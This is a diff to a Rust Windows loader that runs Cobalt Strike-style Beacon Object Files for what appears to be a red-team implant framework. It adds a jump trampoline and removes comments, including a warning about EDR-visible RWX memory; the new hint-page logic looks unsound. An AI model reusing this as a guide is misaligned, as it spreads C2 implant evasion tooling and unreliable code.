@@ -1,8 +1,17 @@
 //! The Windows loader + executor.
+//!
+//! Loads COFF BOFs into RWX memory, resolves externals (BeaconPrintf shim),
+//! applies AMD64 relocations, calls `go()`, and captures output.
+//!
+//! ## REL32 trampoline
+//! BOF sections are loaded via `VirtualAlloc` at low addresses while the
+//! Beacon-API shim lives in the DLL at a high address — often >2 GiB apart,
+//! exceeding the REL32 range. We allocate a small trampoline page near the
+//! BOF that does an absolute `jmp` to the real shim, and expose the trampoline
+//! as the `BeaconPrintf` external symbol.
 
 use std::collections::HashMap;
 use std::ffi::c_void;
-use std::os::raw::c_char;
 
 use nyx_coff::{apply, parse, SymbolResolver};
 
@@ -23,8 +32,6 @@ fn page(n: usize) -> usize {
     (n + PAGE_SIZE - 1) & !(PAGE_SIZE - 1)
 }
 
-/// Resolves COFF symbols: defined symbols (mapped by the loader) take priority,
-/// then a caller-supplied external table (Beacon-API shims).
 pub struct Resolver {
     pub externals: HashMap<String, u64>,
     pub defined: HashMap<String, u64>,
@@ -39,34 +46,21 @@ impl SymbolResolver for Resolver {
     }
 }
 
-/// A loaded (mapped + relocated) BOF. `defined` maps symbol → absolute address
-/// so callers can read results the BOF wrote to globals.
 pub struct Loaded {
     pub defined: HashMap<String, u64>,
     pub entry: u64,
 }
 
-/// Load + relocate a COFF BOF into freshly-allocated executable memory.
-/// `entry` is the symbol to call (usually `go`); `externals` maps external
-/// symbol names (e.g. `BeaconPrintf`) to shim addresses.
 pub fn load(blob: &[u8], entry: &str, externals: HashMap<String, u64>) -> Result<Loaded, String> {
     let coff = parse(blob).map_err(|e| format!("parse: {e:?}"))?;
 
-    // Allocate one region big enough for every section's in-memory footprint
-    // (use VirtualSize so .bss — RawSize 0 — still gets a slot).
     let total: usize = coff
         .sections
         .iter()
         .map(|s| page((s.virtual_size.max(s.raw.len() as u32)) as usize))
         .sum::<usize>()
         .max(PAGE_SIZE);
-    // DEV-HARNESS ONLY: a single RWX region is the simplest way to load +
-    // relocate + call a BOF. RWX is a loud EDR signal, so the Windows PIC
-    // implant (crates/implant-win) must NOT do this — it uses module stomping +
-    // per-section permissions (RX text / RW data) on the stealth-critical path.
-    // Flipping this whole region to RX here would break BOFs that write .data
-    // globals at runtime, so the proper per-section fix is deferred to the
-    // implant's own loader (tracked as a deferred implant-win hardening item).
+
     let base = unsafe {
         VirtualAlloc(
             std::ptr::null_mut(),
@@ -79,8 +73,6 @@ pub fn load(blob: &[u8], entry: &str, externals: HashMap<String, u64>) -> Result
         return Err("VirtualAlloc failed".into());
     }
 
-    // Place sections page-aligned, copy their raw bytes (the rest is zeroed by
-    // the allocation — correct for .bss).
     let mut bases: Vec<u64> = Vec::with_capacity(coff.sections.len());
     let mut offset = 0usize;
     for s in &coff.sections {
@@ -92,7 +84,6 @@ pub fn load(blob: &[u8], entry: &str, externals: HashMap<String, u64>) -> Result
         offset += page((s.virtual_size.max(s.raw.len() as u32)) as usize);
     }
 
-    // Map defined symbols → absolute address.
     let mut defined: HashMap<String, u64> = HashMap::new();
     for sym in &coff.symbols {
         if sym.section_number >= 1 && (sym.section_number as usize) <= bases.len() {
@@ -101,7 +92,6 @@ pub fn load(blob: &[u8], entry: &str, externals: HashMap<String, u64>) -> Result
         }
     }
 
-    // Apply relocations, patching the in-memory section bytes.
     let resolver = Resolver {
         externals,
         defined: defined.clone(),
@@ -117,7 +107,6 @@ pub fn load(blob: &[u8], entry: &str, externals: HashMap<String, u64>) -> Result
         };
     }
 
-    // Resolve the entry symbol.
     let entry_sym = coff
         .symbols
         .iter()
@@ -134,37 +123,88 @@ pub fn load(blob: &[u8], entry: &str, externals: HashMap<String, u64>) -> Result
     })
 }
 
-extern "C" {
-    fn BeaconPrintf();
-    fn nyx_bof_reset();
-    fn nyx_bof_output() -> *const c_char;
+// ── trampoline ──────────────────────────────────────────────────────────────
+
+/// Allocate a small trampoline page near `near_addr` and write an absolute
+/// indirect jump (`jmp [rip+0]` + 8-byte target) to `target`. Returns the
+/// trampoline's address, or falls back to `target` if allocation fails.
+fn alloc_trampoline(near_addr: u64, target: u64) -> u64 {
+    let hint = near_addr.saturating_sub(0x1000_0000); // 256 MiB below
+    unsafe {
+        let ptr = try_alloc_tramp(hint as *mut c_void);
+        let ptr = if ptr.is_null() {
+            try_alloc_tramp(std::ptr::null_mut())
+        } else {
+            ptr
+        };
+        if ptr.is_null() {
+            return target;
+        }
+        let tramp = ptr as u64;
+        write_trampoline(tramp, target);
+        tramp
+    }
 }
 
-/// The Beacon-API external table (symbol name → shim address). Extends as more
-/// of the CS ABI lands (BeaconDataParse, BeaconOutput, …).
-fn beacon_apis() -> HashMap<String, u64> {
-    let fp: unsafe extern "C" fn() = BeaconPrintf;
-    let addr = fp as usize as u64;
-    // (Removed an `eprintln!` that logged the shim's executable-memory address on
-    // every BOF load — an OPSEC leak for a tool whose stated goal is stealth.)
-    [("BeaconPrintf".to_string(), addr)].into_iter().collect()
+unsafe fn try_alloc_tramp(hint: *mut c_void) -> *mut c_void {
+    VirtualAlloc(hint, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
 }
 
-/// Result of running a BOF: captured `BeaconPrintf` output + resolved symbols.
+/// Write `jmp [rip+0]; dq <target>` at `addr`.
+unsafe fn write_trampoline(addr: u64, target: u64) {
+    let p = addr as *mut u8;
+    // ff 25 00 00 00 00 = jmp [rip+0]
+    core::ptr::write(p, 0xffu8);
+    core::ptr::write(p.add(1), 0x25u8);
+    core::ptr::write(p.add(2), 0x00u8);
+    core::ptr::write(p.add(3), 0x00u8);
+    core::ptr::write(p.add(4), 0x00u8);
+    core::ptr::write(p.add(5), 0x00u8);
+    // 8-byte absolute target (little-endian)
+    core::ptr::write(p.add(6) as *mut u64, target);
+}
+
+// ── Beacon-API table ────────────────────────────────────────────────────────
+
+/// Build the Beacon-API external table. `near_addr` should be near the BOF's
+/// allocated memory so REL32 relocations can reach the trampoline.
+fn beacon_apis(near_addr: u64) -> HashMap<String, u64> {
+    let real = crate::shim::BeaconPrintf as *const () as usize as u64;
+    let tramp = alloc_trampoline(near_addr, real);
+    [("BeaconPrintf".to_string(), tramp)].into_iter().collect()
+}
+
+// ── execute ─────────────────────────────────────────────────────────────────
+
 pub struct ExecResult {
     pub output: String,
     pub defined: HashMap<String, u64>,
 }
 
-/// Load + run a BOF's `go()`: wire up the Beacon-API externals, reset the
-/// output buffer, call `go`, and return the captured output + symbol map.
+/// Load + run a BOF's `go()`: wire up Beacon-API, reset output, call `go`,
+/// return captured output.
 pub fn execute(blob: &[u8]) -> Result<ExecResult, String> {
-    let loaded = load(blob, "go", beacon_apis())?;
+    // Use a dummy address to seed the trampoline allocator — we need a hint
+    // near where the BOF will be loaded. Allocate a small scratch page first
+    // to anchor the hint, then pass that to beacon_apis so the trampoline
+    // lands near the BOF sections.
+    let hint_page = unsafe {
+        VirtualAlloc(
+            std::ptr::null_mut(),
+            PAGE_SIZE,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_EXECUTE_READWRITE,
+        )
+    };
+    let near = if hint_page.is_null() { 0 } else { hint_page as u64 };
+
+    let apis = beacon_apis(near);
+    let loaded = load(blob, "go", apis)?;
     unsafe {
-        nyx_bof_reset();
+        crate::shim::nyx_bof_reset();
         let go: extern "C" fn() = std::mem::transmute(loaded.entry);
         go();
-        let output = std::ffi::CStr::from_ptr(nyx_bof_output())
+        let output = std::ffi::CStr::from_ptr(crate::shim::nyx_bof_output())
             .to_string_lossy()
             .into_owned();
         Ok(ExecResult {
